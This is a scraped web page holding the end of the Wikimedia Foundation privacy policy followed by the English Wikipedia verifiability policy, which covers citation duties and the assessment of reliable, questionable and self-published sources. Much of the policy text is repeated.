For information about how you may request removal of your Personal Information, or other rights you may have with respect to your Personal Information, see our FAQ. If you would like to request to access, update or restrict/object to the processing of Personal Information, or receive a copy of your Personal Information for purposes of transmitting it to another organization, you may Contact Us. We will respond to your request consistent with applicable law.

Please note also that you may be able to exercise some of these rights without our intervention. For example, if you are a registered user, you can access and update some Personal Information in your Preferences, as well as download your user account data. You may also manage what kinds of notifications you receive and how often you receive them by going to your Notifications Preferences.

IMPORTANT INFO

For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.




WHERE IS THE FOUNDATION & WHAT DOES THAT MEAN FOR ME?



The Wikimedia Foundation is a non-profit organization based in San Francisco, California, with servers and data centers located in the U.S. If you decide to use Wikimedia Sites, whether from inside or outside of the U.S., you understand that your Personal Information will be collected, transferred, stored, processed, disclosed and otherwise used in the U.S. as described in this Privacy Policy. You also understand that your information may be transferred by us from the U.S. to other countries, which may have different or less stringent data protection laws than your country, in connection with providing services to you.

OUR RESPONSE TO DO NOT TRACK (DNT) SIGNALS



We are strongly committed to protecting users' Personal Information. Under this Policy, we may share your information only under particular situations, which you can learn more about in the "When May We Share Your Information" section of this Privacy Policy. In particular, we do not share your Personal Information for marketing purposes.

Because we protect all users in accordance with this Privacy Policy, we do not change our behavior in response to a web browser's "do not track" signal. For more information regarding Do Not Track signals and how we handle them, please visit our FAQ.

Back to top



CHANGES TO THIS PRIVACY POLICY



Substantial changes to this Policy will not be made until after a public comment period of at least 30 days.

Because things naturally change over time and we want to ensure our Privacy Policy accurately reflects our practices and the law, it may be necessary to modify this Privacy Policy from time to time. We reserve the right to do so in the following manner:

 * In the event of substantial changes, we will provide the proposed changes to our users in at least three (3) languages (selected at our discretion) for an open comment period lasting at least thirty (30) calendar days. Prior to the start of any comment period, we will provide notice of such changes and the opportunity to comment via the Wikimedia Sites, and via a notification on WikimediaAnnounce-L or a similar mailing list.
 * For minor changes, such as grammatical fixes, administrative or legal changes, or corrections of inaccurate statements, we will post the changes and, when possible, provide at least three (3) calendar days' prior notice via WikimediaAnnounce-L or similar mailing list.

We ask that you please review the most up-to-date version of our Privacy Policy. Your continued use of the Wikimedia Sites after any effective date of a subsequent version of this Privacy Policy constitutes acceptance of this Privacy Policy on your part.

Wikipedia policy on verifiability of information

This page documents an English Wikipedia policy.
It describes a widely accepted standard that all editors should normally follow. Changes made to it should reflect consensus.

Shortcut
 * WP:V

This page in a nutshell: People must be able to check that any of the information within Wikipedia articles is not just made up. This means all material must be attributable to reliable, published sources. Additionally, quotations and any material challenged or likely to be challenged must be supported by inline citations.

Content policies

 * Short URL
   
   w.wiki/FVY

In the English Wikipedia, verifiability means that people are able to check that information comes from a reliable source. Its content is determined by published information rather than editors' beliefs, experiences, or previously unpublished ideas or information. Even if you are sure something is true, it must have been previously published in a reliable source before you can add it.[a] If reliable sources disagree with each other, then maintain a neutral point of view and present what the various sources say, giving each side its due weight.

All material in Wikipedia mainspace, including everything in articles, lists, and captions, must be verifiable. Additionally, four types of information must be accompanied by an inline citation to a reliable source that directly supports[b] the material:

 * direct quotations,
 * material whose verifiability has been challenged,
 * material whose verifiability is likely to be challenged, and
 * contentious material about living and recently deceased persons.

Any material that needs an inline citation but does not have one may be removed. Please immediately remove contentious material about living people (or existing groups) that is unsourced or poorly sourced.

For how to write citations, see citing sources. Verifiability, no original research, and neutral point of view are Wikipedia's core content policies. They work together to determine content, so editors should understand the key points of all three. Articles must also comply with the copyright policy.




RESPONSIBILITY FOR PROVIDING CITATIONS


Shortcut
 * WP:BURDEN

"WP:PROVEIT" redirects here. For the editing tool, see Wikipedia:ProveIt.
"WP:CHALLENGE" redirects here. For challenging closes, see Wikipedia:Closing discussions § Challenging a closure.
See also: Wikipedia:Editing policy § Try to fix problems

All content must be verifiable. The burden to demonstrate verifiability lies with the editor who adds or restores material, and it is satisfied by providing an inline citation to a reliable source that directly supports[b] the contribution.[c]

Using inline citations, provide reliable, published sources for all:

 * direct quotations,
 * material the verifiability of which has been challenged
 * material the verifiability of which is likely to be challenged, and
 * contentious material about living and recently deceased persons.

The cited source must clearly support the material as presented in the article. Cite the source clearly, ideally giving page number(s)—though sometimes a section, chapter, or other division may be appropriate instead; see Wikipedia:Citing sources for details of how to do this.

Any material lacking an inline citation to a reliable source that directly supports[b] the material may be removed and should not be restored without an inline citation to a reliable source. Whether or how quickly material should be removed for lacking an inline citation to a reliable source depends on the material and the overall state of the article. Consider adding a citation needed tag as an interim step to removing to allow references to be added.[d] When tagging or removing material for lacking an inline citation, state your concern that it may not be possible to find a published reliable source, and the material therefore may not be verifiable.[e] If you think the material is verifiable, you are encouraged to provide an inline citation yourself before removing or tagging it.

Do not leave unsourced or poorly sourced material in an article if it might damage the reputation of living people or existing groups, and do not move it to the talk page. You should also be aware of how Wikipedia:Biographies of living persons also applies to groups.


RELIABLE SOURCES


Shortcut
 * WP:SOURCE

"WP:SOURCE" redirects here. For how to reference sources, see Help:Referencing for beginners.


WHAT COUNTS AS A RELIABLE SOURCE

Further information: Wikipedia:Reliable sources

A cited source on Wikipedia is often a specific portion of text (such as a short article or a page in a book). But when editors discuss sources (for example, to debate their appropriateness or reliability) the word source has four related meanings:

 * The work itself (the article, book) and works like it ("An obituary can be a useful biographical source", "A recent source is better than an old one")
 * The creator of the work (the writer, journalist: "What do we know about that source's reputation?") and people like them ("A medical researcher is a better source than a journalist for medical claims").
 * The publication (for example, the newspaper, journal, magazine: "That source covers the arts.") and publications like them ("A newspaper is not a reliable source for medical claims").
 * The publisher of the work (for example, Cambridge University Press: "That source publishes reference works.") and publishers like them ("An academic publisher is a good source of reference works").

All four can affect reliability.

Base articles on reliable, independent, published sources with a reputation for fact-checking and accuracy. Source material must be published, on Wikipedia meaning made available to the public in some form.[f] Unpublished material is not considered reliable. Use sources that directly support the material presented in an article and are appropriate to the claims made. The appropriateness of any source depends on the context. Be especially careful when sourcing content related to living people or medicine.

If available, academic and peer-reviewed publications are usually the most reliable sources on topics such as history, medicine, and science.

Editors may also use material from reliable non-academic sources, particularly if it appears in respected mainstream publications. Other reliable sources include:

 * University-level textbooks
 * Books published by respected publishing houses
 * Mainstream (non-fringe) magazines, including specialty ones
 * Reputable newspapers

Editors may also use electronic media, subject to the same criteria (see details in Wikipedia:Identifying reliable sources and Wikipedia:Search engine test).

BEST SOURCES

The best sources have a professional structure for checking or analyzing facts, legal issues, evidence, and arguments. The greater the degree of scrutiny given to these issues, the more reliable the source.


NEWSPAPER AND MAGAZINE BLOGS


Shortcut
 * WP:NEWSBLOG

Some newspapers, magazines, and other news organizations host online pages or columns they call blogs. These may be acceptable sources if the writers are professionals, but use them with caution because blogs may not be subject to the news organization's normal fact-checking process.[g] If a news organization publishes an opinion piece in a blog, attribute the statement to the writer, e.g. "Jane Smith wrote ..." Never use the blog comments that are left by the readers as sources. For personal or group blogs that are not reliable sources, see § Self-published sources below.


RELIABLE SOURCES NOTICEBOARD AND GUIDELINE

Further information: Wikipedia:Reliable sources and Wikipedia:Reliable sources/Noticeboard

To discuss the reliability of a specific source for a particular statement, consult Wikipedia:Reliable sources/Noticeboard, which seeks to apply this policy to particular cases. For a guideline discussing the reliability of particular types of sources, see Wikipedia:Reliable sources. In the case of inconsistency between this policy and the Wikipedia:Reliable sources guideline, or any other guideline related to sourcing, this policy has priority.


SOURCES THAT ARE USUALLY NOT RELIABLE

"WP:NOTRELIABLE" redirects here. For Wikipedia's own reliability, see Wikipedia:Don't cite Wikipedia on Wikipedia.
See also: Wikipedia:Reliable sources § Questionable and self-published sources, and Wikipedia:Reliable sources/Perennial sources

Shortcut
 * WP:NOTRS


QUESTIONABLE SOURCES

Questionable sources are those that have a poor reputation for checking the facts, lack meaningful editorial oversight, or have an apparent conflict of interest.

Such sources include websites and publications expressing views widely considered by other sources to be promotional, extremist, or relying heavily on unsubstantiated gossip, rumor, or personal opinion. Questionable sources should be used only as sources for material on themselves, such as in articles about themselves; see below. They are not suitable sources for contentious claims about others.

Predatory open access journals are considered questionable due to the absence of quality control in the peer-review process.


SELF-PUBLISHED SOURCES


Shortcuts
 * WP:SPS
 * WP:BLOGS

Further information: Wikipedia:Biographies of living persons § Avoid self-published sources, Wikipedia:List of companies engaged in the self-publishing business, and Wikipedia:Identifying and using self-published works
"WP:WORDPRESS" redirects here. For the use of Wordpress as a source, see WP:RSPWORDPRESS.

Anyone can create a personal web page, self-publish a book, or claim to be an expert. That is why self-published material such as books, patents, newsletters, personal websites, open wikis, personal or group blogs (as distinguished from newsblogs, above), content farms, podcasts, Internet forum postings, and social media postings are largely not acceptable as sources. Self-published expert sources may be considered reliable when produced by an established subject-matter expert, whose work in the relevant field has previously been published by reliable, independent publications.[g] Exercise caution when using such sources: if the information in question is suitable for inclusion, someone else will probably have published it in independent, reliable sources.[1] Never use self-published sources as third-party sources about living people, even if the author is an expert, well-known professional researcher, or writer.


SELF-PUBLISHED OR QUESTIONABLE SOURCES AS SOURCES ON THEMSELVES

"WP:SOCIALMEDIA" redirects here. For the policy on what Wikipedia is not, see WP:NOTSOCIALMEDIA.
"WP:TWITTER" redirects here. For the external links essay, see WP:Twitter-EL. For a template used for citing tweets, see Template:Cite tweet. For community evaluation of Twitter as a source, see Wikipedia:Reliable sources/Perennial sources § Twitter.
See also: Wikipedia:Reliable sources § Statements of opinion

Shortcut
 * WP:ABOUTSELF

Self-published and questionable sources may be used as sources of information about themselves, usually in articles about themselves or their activities, without the self-published source requirement that they are established experts in the field, so long as:

 1. The material is neither unduly self-serving nor an exceptional claim;
 2. It does not involve claims about third parties;
 3. It does not involve claims about events not directly related to the source;
 4. There is no reasonable doubt as to its authenticity; and
 5. The article is not based primarily on such sources.

This policy also applies to material made public by the source on social networking websites such as Twitter, Tumblr, LinkedIn, Reddit, Instagram and Facebook.


WIKIPEDIA AND SOURCES THAT MIRROR OR USE IT


Shortcuts
 * WP:CIRCULAR
 * WP:CIRC

"WP:CIRCULAR" redirects here. For links on a page that redirect back to the same page, see MOS:CIRCULAR.
See also: WP:COPYWITHIN, Wikipedia:List of citogenesis incidents, Wikipedia:Citing Wikipedia, Wikipedia:Wikipedia is not a reliable source, and Wikipedia:ABOUTSELF

Do not use articles from Wikipedia (whether English Wikipedia or Wikipedias in other languages) as sources, since Wikipedia is a user-generated source. Also, do not use websites mirroring Wikipedia content or publications relying on material from Wikipedia as sources. Content from a Wikipedia article is not considered reliable unless it is backed up by citing reliable sources. Confirm that these sources support the content, then use them directly.[2]

An exception is allowed when Wikipedia itself is being discussed in the article. These may cite an article, guideline, discussion, statistic, or other content from Wikipedia (or a sister project) to support a statement about Wikipedia. Wikipedia or the sister project is a primary source in this case and may be used following the policy for primary sources. Any such use should avoid original research, undue emphasis on Wikipedia's role or views, and inappropriate self-reference. The article text should clarify how the material is sourced from Wikipedia to inform the reader about the potential bias.


ACCESSIBILITY


ACCESS TO SOURCES


Shortcut
 * WP:PAYWALL

See also: Wikipedia:Offline sources, Wikipedia:WikiProject Resource Exchange/Resource Request, and Wikipedia:Reliable sources/Cost

Do not reject reliable sources just because they are difficult or costly to access. Some reliable sources are not easily accessible. For example, an online source may require payment, and a print-only source may be available only through libraries. Rare historical sources may even be available only in special museum collections and archives. If you have trouble accessing a source, others may be able to do so on your behalf (see WikiProject Resource Exchange).


NON-ENGLISH SOURCES


Shortcut
 * WP:NONENG

See also: Wikipedia:Translators available and Wikipedia:No original research § Translations and transcriptions

CITING

Citations to non-English reliable sources are allowed on the English Wikipedia. However, because this project is in English, English-language sources are preferred over non-English ones when they are available and of equal quality and relevance. As with sources in English, if a dispute arises involving a citation to a non-English source, editors may request a quotation of relevant portions of the original source be provided, either in text, in a footnote, or on the article talk page.[h] (See Template:Request quotation.)

QUOTING

If you quote a non-English reliable source (whether in the main text or in a footnote), a translation into English should accompany the quote. Translations published by reliable sources are preferred over translations by Wikipedians, but translations by Wikipedians are preferred over machine translations. When using a machine translation of source material, editors should be reasonably certain that the translation is accurate and the source is appropriate. Editors should not rely upon machine translations of non-English sources in contentious articles or biographies of living people. If needed, ask an editor who can translate it for you.

The original text is usually included with the translated text in articles when translated by Wikipedians, and the translating editor is usually not cited. When quoting any material, whether in English or in some other language, be careful not to violate copyright; see the fair-use guideline.


OTHER ISSUES


VERIFIABILITY DOES NOT GUARANTEE INCLUSION


Shortcut
 * WP:VNOT

Main page: Wikipedia:What Wikipedia is not § Encyclopedic content
See also: WP:UNDUE, WP:PAGEDECIDE, WP:PRESERVE, WP:SUMMARY, and WP:IINFO

While information must be verifiable for inclusion in an article, not all verifiable information must be included. Consensus may determine that certain information does not improve an article, and other policies may indicate that the material is inappropriate. Such information should be omitted or presented instead in a different article.


Shortcut
 * WP:ONUS

"WP:ONUS" redirects here. For the responsibility to demonstrate verifiability, see WP:BURDEN.

The responsibility for achieving consensus for inclusion is on those seeking to include disputed content.


TAGGING A SENTENCE, SECTION, OR ARTICLE

Further information: Wikipedia:Citation needed and Wikipedia:Template index/Sources of articles

If you want to request an inline citation for an unsourced statement, you can tag a sentence with the {{citation needed}} template by writing {{cn}} or {{fact}}. Other templates exist for tagging sections or entire articles here. You can also leave a note on the talk page asking for a source, or move the material to the talk page and ask for a source there. To request verification that a reference supports the text, tag it with {{verification needed}}. Material that fails verification may be tagged with {{failed verification}} or removed. It helps other editors to explain your rationale for using templates to tag material in the template, edit summary, or on the talk page.

Take special care with contentious material about living and recently deceased people. Unsourced or poorly sourced material that is contentious, especially text that is negative, derogatory, or potentially damaging, should be removed immediately rather than tagged or moved to the talk page.


EXCEPTIONAL CLAIMS REQUIRE EXCEPTIONAL SOURCING




Shortcuts
 * WP:REDFLAG
 * WP:EXCEPTIONAL
 * WP:ECREE

See also: Wikipedia:Fringe theories

Any exceptional claim requires multiple high-quality sources.[3] Warnings (red flags) that should prompt extra caution include:

 * Surprising or apparently important claims not covered by multiple mainstream sources;
 * Challenged claims that are supported purely by primary or self-published sources or those with an apparent conflict of interest;
 * Reports of a statement by someone that seems out of character or against an interest they had previously defended;
 * Claims contradicted by the prevailing view within the relevant community or that would significantly alter mainstream assumptions—especially in science, medicine, history, politics, and biographies of living and recently dead people. This is especially true when proponents say there is a conspiracy to silence them.


VERIFIABILITY AND OTHER PRINCIPLES


COPYRIGHT AND PLAGIARISM

Further information: Wikipedia:Copyright, Wikipedia:Plagiarism, Wikipedia:Copying within Wikipedia, Wikipedia:MOS § Attribution, and Wikipedia:CITE § In-text attribution

Shortcut
 * WP:OWNWORDS

Do not plagiarize or breach copyright when using sources. Summarize source material in your own words as much as possible; when quoting or closely paraphrasing a source, use an inline citation, and in-text attribution where appropriate.

Do not link to any source that violates the copyrights of others per contributors' rights and obligations. You can link to websites that display copyrighted works as long as the website has licensed the work or uses the work in a way compliant with fair use. Knowingly directing others to material that violates copyright may be considered contributory copyright infringement. If there is reason to think a source violates copyright, do not cite it. This is particularly relevant when linking to sites such as Scribd or YouTube, where due care should be taken to avoid linking to material violating copyright.


NEUTRALITY

Further information: Wikipedia:Neutral point of view

Shortcut
 * WP:SOURCESDIFFER

Even when information is cited to reliable sources, you must present it with a neutral point of view (NPOV). Articles should be based on thorough research of sources. All articles must adhere to NPOV, fairly representing all majority and significant-minority viewpoints published by reliable sources, in rough proportion to the prominence of each view. Tiny-minority views need not be included, except in articles devoted to them. If there is a disagreement between sources, use in-text attribution: "John Smith argues X, while Paul Jones maintains Y," followed by an inline citation. Sources themselves do not need to maintain a neutral point of view. Indeed, many reliable sources are not neutral. Our job as editors is simply to summarize what reliable sources say.


NOTABILITY

Further information: Wikipedia:Notability

If no reliable, independent sources can be found on a topic, Wikipedia should not have an article on it (i.e., the topic is not notable). However, notability is based on the existence of suitable sources, not on the state of sourcing in an article.


ORIGINAL RESEARCH

Further information: Wikipedia:No original research

The no original research policy (NOR) is closely related to the Verifiability policy. Among its requirements are:

 1. All material in Wikipedia articles must be attributable to a reliable published source. This means a reliable published source must exist for it, whether or not it is cited in the article.
 2. Sources must support the material clearly and directly: drawing inferences from multiple sources to advance a novel position is prohibited by the NOR policy.[h]
 3. Base articles largely on reliable secondary sources. While primary sources are appropriate in some cases, relying on them can be problematic. For more information, see the Primary, secondary, and tertiary sources section of the NOR policy, and the Misuse of primary sources section of the BLP policy.

NOTES

 1. ^ This principle was previously expressed on this policy page as "the threshold for inclusion is verifiability, not truth". See the essay, Wikipedia:Verifiability, not truth.
 2. ^ a b c A source "directly supports" a given piece of material if the information is present explicitly in the source, so that using this source to support the material is not a violation of Wikipedia:No original research. The location of any citation—including whether one is present in the article at all—is unrelated to whether a source directly supports the material. For questions about where and how to place citations, see Wikipedia:Citing sources, Wikipedia:Manual of Style/Lead section § Citations, etc.
 3. ^ Once an editor has provided any source they believe, in good faith, to be sufficient, then any editor who later removes the material must articulate specific problems that would justify its exclusion from Wikipedia (e.g., why the source is unreliable; the source does not support the claim; undue emphasis; unencyclopedic content; etc.). If necessary, all editors are then expected to help achieve consensus, and any problems with the text or sourcing should be fixed before the material is added back.
 4. ^ It may be that the article contains so few citations it is impractical to add specific citation needed tags. Consider then tagging a section with {{unreferenced section}}, or the article with the applicable of either {{unreferenced}} or {{more citations needed}}. For a disputed category, you may use {{unreferenced category}}. For a disambiguation page, consider asking for a citation on the talk page.
 5. ^ When tagging or removing such material, please communicate your reasons why. Some editors object to others making frequent and large-scale deletions of unsourced information, especially if unaccompanied by other efforts to improve the material. Do not concentrate only on material of a particular point of view, as that may appear to be a contravention of Wikipedia:Neutral point of view. Also, check to see whether the material is sourced to a citation elsewhere on the page. For all these reasons, it is advisable to clearly communicate that you have a considered reason to believe the material in question cannot be verified
 6. ^ This includes material such as documents in publicly accessible archives as well as inscriptions in plain sight, e.g. tombstones.
 7. ^ a b Note that any exceptional claim would require exceptional sources.
 8. ^ a b When there is a dispute as to whether a piece of text is fully supported by a given source, direct quotes and other relevant details from the source should be provided to other editors as a courtesy. Do not violate the source's copyright when doing so.

 1. ^ Self-published material is characterized by the lack of independent reviewers (those without a conflict of interest) validating the reliability of the content.

     * The University of California, Berkeley, library states: "Most pages found in general search engines for the web are self-published or published by businesses small and large with motives to get you to buy something or believe a point of view. Even within university and library web sites, there can be many pages that the institution does not try to oversee."
     * Princeton University offers this understanding in its publication, Academic Integrity at Princeton (2011): "Unlike most books and journal articles, which undergo strict editorial review before publication, much of the information on the Web is self-published. To be sure, there are many websites in which you can have confidence: mainstream newspapers, refereed electronic journals, and university, library, and government collections of data. But for vast amounts of Web-based information, no impartial reviewers have evaluated the accuracy or fairness of such material before it's made instantly available across the globe."

This page documents an English Wikipedia policy.
It describes a widely accepted standard that all editors should normally follow. Changes made to it should reflect consensus.

Shortcut
 * WP:V

This page in a nutshell: People must be able to check that any of the information within Wikipedia articles is not just made up. This means all material must be attributable to reliable, published sources. Additionally, quotations and any material challenged or likely to be challenged must be supported by inline citations.

   w.wiki/FVY

In the English Wikipedia, verifiability means that people are able to check that information comes from a reliable source. Its content is determined by published information rather than editors' beliefs, experiences, or previously unpublished ideas or information. Even if you are sure something is true, it must have been previously published in a reliable source before you can add it.[a] If reliable sources disagree with each other, then maintain a neutral point of view and present what the various sources say, giving each side its due weight.

All material in Wikipedia mainspace, including everything in articles, lists, and captions, must be verifiable. Additionally, four types of information must be accompanied by an inline citation to a reliable source that directly supports[b] the material:

 * direct quotations,
 * material whose verifiability has been challenged,
 * material whose verifiability is likely to be challenged, and
 * contentious material about living and recently deceased persons.

Any material that needs an inline citation but does not have one may be removed. Please immediately remove contentious material about living people (or existing groups) that is unsourced or poorly sourced.

For how to write citations, see citing sources. Verifiability, no original research, and neutral point of view are Wikipedia's core content policies. They work together to determine content, so editors should understand the key points of all three. Articles must also comply with the copyright policy.




RESPONSIBILITY FOR PROVIDING CITATIONS


Shortcut
 * WP:BURDEN

"WP:PROVEIT" redirects here. For the editing tool, see Wikipedia:ProveIt.
"WP:CHALLENGE" redirects here. For challenging closes, see Wikipedia:Closing discussions § Challenging a closure.
See also: Wikipedia:Editing policy § Try to fix problems

All content must be verifiable. The burden to demonstrate verifiability lies with the editor who adds or restores material, and it is satisfied by providing an inline citation to a reliable source that directly supports[b] the contribution.[c]

Using inline citations, provide reliable, published sources for all:

 * direct quotations,
 * material the verifiability of which has been challenged
 * material the verifiability of which is likely to be challenged, and
 * contentious material about living and recently deceased persons.

The cited source must clearly support the material as presented in the article. Cite the source clearly, ideally giving page number(s)—though sometimes a section, chapter, or other division may be appropriate instead; see Wikipedia:Citing sources for details of how to do this.

Any material lacking an inline citation to a reliable source that directly supports[b] the material may be removed and should not be restored without an inline citation to a reliable source. Whether or how quickly material should be removed for lacking an inline citation to a reliable source depends on the material and the overall state of the article. Consider adding a citation needed tag as an interim step to removing to allow references to be added.[d] When tagging or removing material for lacking an inline citation, state your concern that it may not be possible to find a published reliable source, and the material therefore may not be verifiable.[e] If you think the material is verifiable, you are encouraged to provide an inline citation yourself before removing or tagging it.

Do not leave unsourced or poorly sourced material in an article if it might damage the reputation of living people or existing groups, and do not move it to the talk page. You should also be aware of how Wikipedia:Biographies of living persons also applies to groups.


RELIABLE SOURCES


Shortcut
 * WP:SOURCE

"WP:SOURCE" redirects here. For how to reference sources, see Help:Referencing for beginners.


WHAT COUNTS AS A RELIABLE SOURCE

Further information: Wikipedia:Reliable sources

A cited source on Wikipedia is often a specific portion of text (such as a short article or a page in a book). But when editors discuss sources (for example, to debate their appropriateness or reliability) the word source has four related meanings:

 * The work itself (the article, book) and works like it ("An obituary can be a useful biographical source", "A recent source is better than an old one")
 * The creator of the work (the writer, journalist: "What do we know about that source's reputation?") and people like them ("A medical researcher is a better source than a journalist for medical claims").
 * The publication (for example, the newspaper, journal, magazine: "That source covers the arts.") and publications like them ("A newspaper is not a reliable source for medical claims").
 * The publisher of the work (for example, Cambridge University Press: "That source publishes reference works.") and publishers like them ("An academic publisher is a good source of reference works").

All four can affect reliability.

Base articles on reliable, independent, published sources with a reputation for fact-checking and accuracy. Source material must be published, on Wikipedia meaning made available to the public in some form.[f] Unpublished material is not considered reliable. Use sources that directly support the material presented in an article and are appropriate to the claims made. The appropriateness of any source depends on the context. Be especially careful when sourcing content related to living people or medicine.

If available, academic and peer-reviewed publications are usually the most reliable sources on topics such as history, medicine, and science.

Editors may also use material from reliable non-academic sources, particularly if it appears in respected mainstream publications. Other reliable sources include:

 * University-level textbooks
 * Books published by respected publishing houses
 * Mainstream (non-fringe) magazines, including specialty ones
 * Reputable newspapers

Editors may also use electronic media, subject to the same criteria (see details in Wikipedia:Identifying reliable sources and Wikipedia:Search engine test).

BEST SOURCES

The best sources have a professional structure for checking or analyzing facts, legal issues, evidence, and arguments. The greater the degree of scrutiny given to these issues, the more reliable the source.


NEWSPAPER AND MAGAZINE BLOGS


Shortcut
 * WP:NEWSBLOG

Some newspapers, magazines, and other news organizations host online pages or columns they call blogs. These may be acceptable sources if the writers are professionals, but use them with caution because blogs may not be subject to the news organization's normal fact-checking process.[g] If a news organization publishes an opinion piece in a blog, attribute the statement to the writer, e.g. "Jane Smith wrote ..." Never use the blog comments that are left by the readers as sources. For personal or group blogs that are not reliable sources, see § Self-published sources below.


RELIABLE SOURCES NOTICEBOARD AND GUIDELINE

Further information: Wikipedia:Reliable sources and Wikipedia:Reliable sources/Noticeboard

To discuss the reliability of a specific source for a particular statement, consult Wikipedia:Reliable sources/Noticeboard, which seeks to apply this policy to particular cases. For a guideline discussing the reliability of particular types of sources, see Wikipedia:Reliable sources. In the case of inconsistency between this policy and the Wikipedia:Reliable sources guideline, or any other guideline related to sourcing, this policy has priority.


SOURCES THAT ARE USUALLY NOT RELIABLE

"WP:NOTRELIABLE" redirects here. For Wikipedia's own reliability, see Wikipedia:Don't cite Wikipedia on Wikipedia.
See also: Wikipedia:Reliable sources § Questionable and self-published sources, and Wikipedia:Reliable sources/Perennial sources

Shortcut
 * WP:NOTRS


QUESTIONABLE SOURCES

Questionable sources are those that have a poor reputation for checking the facts, lack meaningful editorial oversight, or have an apparent conflict of interest.

Such sources include websites and publications expressing views widely considered by other sources to be promotional, extremist, or relying heavily on unsubstantiated gossip, rumor, or personal opinion. Questionable sources should be used only as sources for material on themselves, such as in articles about themselves; see below. They are not suitable sources for contentious claims about others.

Predatory open access journals are considered questionable due to the absence of quality control in the peer-review process.


SELF-PUBLISHED SOURCES


Shortcuts
 * WP:SPS
 * WP:BLOGS

Further information: Wikipedia:Biographies of living persons § Avoid self-published sources, Wikipedia:List of companies engaged in the self-publishing business, and Wikipedia:Identifying and using self-published works
"WP:WORDPRESS" redirects here. For the use of Wordpress as a source, see WP:RSPWORDPRESS.

Anyone can create a personal web page, self-publish a book, or claim to be an expert. That is why self-published material such as books, patents, newsletters, personal websites, open wikis, personal or group blogs (as distinguished from newsblogs, above), content farms, podcasts, Internet forum postings, and social media postings are largely not acceptable as sources. Self-published expert sources may be considered reliable when produced by an established subject-matter expert, whose work in the relevant field has previously been published by reliable, independent publications.[g] Exercise caution when using such sources: if the information in question is suitable for inclusion, someone else will probably have published it in independent, reliable sources.[1] Never use self-published sources as third-party sources about living people, even if the author is an expert, well-known professional researcher, or writer.


SELF-PUBLISHED OR QUESTIONABLE SOURCES AS SOURCES ON THEMSELVES

"WP:SOCIALMEDIA" redirects here. For the policy on what Wikipedia is not, see WP:NOTSOCIALMEDIA.
"WP:TWITTER" redirects here. For the external links essay, see WP:Twitter-EL. For a template used for citing tweets, see Template:Cite tweet. For community evaluation of Twitter as a source, see Wikipedia:Reliable sources/Perennial sources § Twitter.
See also: Wikipedia:Reliable sources § Statements of opinion

Shortcut
 * WP:ABOUTSELF

Self-published and questionable sources may be used as sources of information about themselves, usually in articles about themselves or their activities, without the self-published source requirement that they are established experts in the field, so long as:

 1. The material is neither unduly self-serving nor an exceptional claim;
 2. It does not involve claims about third parties;
 3. It does not involve claims about events not directly related to the source;
 4. There is no reasonable doubt as to its authenticity; and
 5. The article is not based primarily on such sources.

This policy also applies to material made public by the source on social networking websites such as Twitter, Tumblr, LinkedIn, Reddit, Instagram and Facebook.


WIKIPEDIA AND SOURCES THAT MIRROR OR USE IT


Shortcuts

 * WP:CIRC

"WP:CIRCULAR" redirects here. For links on a page that redirect back to the same page, see MOS:CIRCULAR.
See also: WP:COPYWITHIN, Wikipedia:List of citogenesis incidents, Wikipedia:Citing Wikipedia, Wikipedia:Wikipedia is not a reliable source, and Wikipedia:ABOUTSELF

Do not use articles from Wikipedia (whether English Wikipedia or Wikipedias in other languages) as sources, since Wikipedia is a user-generated source. Also, do not use websites mirroring Wikipedia content or publications relying on material from Wikipedia as sources. Content from a Wikipedia article is not considered reliable unless it is backed up by citing reliable sources. Confirm that these sources support the content, then use them directly.[2]

An exception is allowed when Wikipedia itself is being discussed in the article. These may cite an article, guideline, discussion, statistic, or other content from Wikipedia (or a sister project) to support a statement about Wikipedia. Wikipedia or the sister project is a primary source in this case and may be used following the policy for primary sources. Any such use should avoid original research, undue emphasis on Wikipedia's role or views, and inappropriate self-reference. The article text should clarify how the material is sourced from Wikipedia to inform the reader about the potential bias.


ACCESSIBILITY


ACCESS TO SOURCES


Shortcut
 * WP:PAYWALL

See also: Wikipedia:Offline sources, Wikipedia:WikiProject Resource Exchange/Resource Request, and Wikipedia:Reliable sources/Cost

Do not reject reliable sources just because they are difficult or costly to access. Some reliable sources are not easily accessible. For example, an online source may require payment, and a print-only source may be available only through libraries. Rare historical sources may even be available only in special museum collections and archives. If you have trouble accessing a source, others may be able to do so on your behalf (see WikiProject Resource Exchange).


NON-ENGLISH SOURCES


Shortcut
 * WP:NONENG

See also: Wikipedia:Translators available and Wikipedia:No original research § Translations and transcriptions

CITING

Citations to non-English reliable sources are allowed on the English Wikipedia. However, because this project is in English, English-language sources are preferred over non-English ones when they are available and of equal quality and relevance. As with sources in English, if a dispute arises involving a citation to a non-English source, editors may request a quotation of relevant portions of the original source be provided, either in text, in a footnote, or on the article talk page.[h] (See Template:Request quotation.)

QUOTING

If you quote a non-English reliable source (whether in the main text or in a footnote), a translation into English should accompany the quote. Translations published by reliable sources are preferred over translations by Wikipedians, but translations by Wikipedians are preferred over machine translations. When using a machine translation of source material, editors should be reasonably certain that the translation is accurate and the source is appropriate. Editors should not rely upon machine translations of non-English sources in contentious articles or biographies of living people. If needed, ask an editor who can translate it for you.

The original text is usually included with the translated text in articles when translated by Wikipedians, and the translating editor is usually not cited. When quoting any material, whether in English or in some other language, be careful not to violate copyright; see the fair-use guideline.


OTHER ISSUES


VERIFIABILITY DOES NOT GUARANTEE INCLUSION


Shortcut
 * WP:VNOT

Main page: Wikipedia:What Wikipedia is not § Encyclopedic content
See also: WP:UNDUE, WP:PAGEDECIDE, WP:PRESERVE, WP:SUMMARY, and WP:IINFO

While information must be verifiable for inclusion in an article, not all verifiable information must be included. Consensus may determine that certain information does not improve an article, and other policies may indicate that the material is inappropriate. Such information should be omitted or presented instead in a different article.


Shortcut
 * WP:ONUS

"WP:ONUS" redirects here. For the responsibility to demonstrate verifiability, see WP:BURDEN.

The responsibility for achieving consensus for inclusion is on those seeking to include disputed content.


TAGGING A SENTENCE, SECTION, OR ARTICLE

Further information: Wikipedia:Citation needed and Wikipedia:Template index/Sources of articles

If you want to request an inline citation for an unsourced statement, you can tag a sentence with the {{citation needed}} template by writing {{cn}} or {{fact}}. Other templates exist for tagging sections or entire articles here. You can also leave a note on the talk page asking for a source, or move the material to the talk page and ask for a source there. To request verification that a reference supports the text, tag it with {{verification needed}}. Material that fails verification may be tagged with {{failed verification}} or removed. It helps other editors to explain your rationale for using templates to tag material in the template, edit summary, or on the talk page.

Take special care with contentious material about living and recently deceased people. Unsourced or poorly sourced material that is contentious, especially text that is negative, derogatory, or potentially damaging, should be removed immediately rather than tagged or moved to the talk page.


